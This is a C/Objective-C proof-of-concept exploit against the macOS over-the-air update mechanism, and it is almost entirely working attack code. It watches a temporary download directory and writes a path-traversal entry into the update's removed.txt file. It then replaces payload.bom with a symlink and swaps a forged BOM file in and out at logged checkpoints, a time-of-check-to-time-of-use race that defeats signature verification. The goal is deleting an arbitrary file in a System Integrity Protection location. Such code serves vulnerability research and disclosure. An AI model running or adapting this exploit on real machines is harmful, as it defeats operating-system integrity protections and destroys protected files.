#import <Foundation/Foundation.h>
#include <dirent.h>
#include <sys/stat.h>

void spin_for_log(const char *hint) {
    static const char *log_path = "/System/Volumes/Update/restore.log";
    FILE *fp = NULL;
    char line[4096] = {0};
    
    fp = fopen(log_path, "r");
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fclose(fp);
    
    int found = 0;
    while (1) {
        fp = fopen(log_path, "r");
        fseek(fp, size, SEEK_SET);
        while (fgets(line, sizeof(line), fp) != NULL) {
            printf("restore.log: %s", line);
            if (strstr(line, hint)) {
                found = 1;
                break;
            }
        }
        size = ftell(fp);
        fclose(fp);
        
        if (found) {
            break;
        }
    }
}

void spin_before_renaming(FILE *pipe) {
    char line[4096] = {0};
    while (fgets(line, sizeof(line), pipe) != NULL) {
        //printf("stdout(pipe): %s", line);
        if (strstr(line, "Moving file in")) {
            break;
        }
    }
}

void poc(const char *target) {
    int ret;
    FILE *fp, *pipe;
    DIR *dp;
    struct dirent *ep;
    const char *tmp_name;
    char path[MAXPATHLEN] = {0};
    
    // 1. get tmp name
    while (1) {
        dp = opendir("/private/var/folders/zz/zyxvpxvq6csfxvn_n00000y800007k/T/com.apple.nsurlsessiond/");
        while ((ep = readdir (dp))) {
            if (strlen(ep->d_name) == 0x1c) { //strlen(CFNetworkDownload_XXXXXX.tmp)==0x1c
                printf("Got tmp name:%s.\n", ep->d_name);
                tmp_name = ep->d_name;
                goto NEXT;
            }
        }
        closedir (dp);
    }
NEXT:
    // 2. wait removed.txt extraction done
    snprintf(path, MAXPATHLEN, "/private/var/folders/zz/zyxvpxvq6csfxvn_n00000y800007k/T/com.apple.nsurlsessiond/%s/AssetData/payloadv2/removed.txt", tmp_name);
    struct stat st;
    while (1) {
        if (0 != stat(path, &st)) {
            continue;
        }
        printf("Got target:%s\n", path);
        if (st.st_size>=8808991) { // 8808991 is the size of the extracted removed.txt, tune the value before compile, sorry for the hardcode
            printf("Target unarchive done. Time to replace/rewrite it\n");
            break;
        }
    }

    pipe = popen("log stream --predicate 'eventMessage contains \"Moving file\"'", "r"); // process:mobileassetd
    
    // 3. rewrite the file removed.txt
    unlink(path);
    fp = fopen(path, "w");
    const char *prefix = "../../../..";
    fwrite(prefix, 1, strlen(prefix), fp);
    fwrite(target, 1, strlen(target), fp);
    fclose(fp);

    snprintf(path, MAXPATHLEN, "/private/var/folders/zz/zyxvpxvq6csfxvn_n00000y800007k/T/com.apple.nsurlsessiond/%s/AssetData/payload.bom", tmp_name);

    // 4. wait the whole process done, before moving to SIP location
    spin_before_renaming(pipe);

    // 5. replace payload.bom with a symlink
    ret = rename(path, "/tmp/payload.bom");
    if (ret != 0) {
        printf("[!] rename ret=%d, errno=%d\n", ret, errno);
        return;
    }
    ret = symlink("/tmp/payload.bom", path); // right before renaming in mobileassetd
    if (ret != 0) {
        printf("[!] symlink ret=%d, errno=%d\n", ret, errno);
        return;
    }

    // 6. bypass the signature verification by TOCTOU attack
    // first verification in function: "-[MSUPrebrain preflightPersonalize:***]"
    // second verification (duplicated) in function: "MSUPrepareUpdate_server"
    // Time window: ["verify_package_signature", "verify_package_contents"]
    
    //spin_for_log("Verifying the package signature");
    spin_for_log("using MobileSoftwareUpdate policy. Will try basic X509.");
    // Passed the signature checking(first time), using the fake bom
    rename("/tmp/payload.bom", "/tmp/origin.bom");
    rename("/tmp/fake.bom", "/tmp/payload.bom");

    spin_for_log("Successfully stored"); // stored /System/Volumes/Update/Preflight.plist
    // Passed the package contents checking(first time), using the original bom, it will check the signature again
    rename("/tmp/payload.bom", "/tmp/fake.bom");
    rename("/tmp/origin.bom", "/tmp/payload.bom");
    
    spin_for_log("using MobileSoftwareUpdate policy. Will try basic X509.");
    // Passed the signature checking(second time), using the fake bom again.
    rename("/tmp/payload.bom", "/tmp/origin.bom");
    rename("/tmp/fake.bom", "/tmp/payload.bom");
    
    printf("[*] Passed all the verification!\nWait for the magic from the OTA Update process\n");
}

int main(int argc, const char * argv[]) {
    if (argc != 2) {
        printf("Usage: %s /path/to/remove\n", argv[0]);
        return -1;
    }
    
    poc(argv[1]);
    return 0;
}
